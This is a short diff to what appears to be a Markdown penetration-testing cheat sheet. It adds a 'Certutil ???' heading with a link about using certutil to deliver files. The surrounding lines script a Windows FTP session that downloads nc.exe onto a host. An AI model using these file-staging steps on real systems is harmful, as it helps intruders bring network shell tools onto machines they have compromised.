@@ -324,6 +324,9 @@ $ echo bin>> ftp.txt
 $ echo GET nc.exe>> ftp.txt
 $ echo bye>> ftp.txt
 $ ftp -v -n -s:ftp.txt
+
+# Certutil ???
+http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
 ```
 
 Vulnerable services:
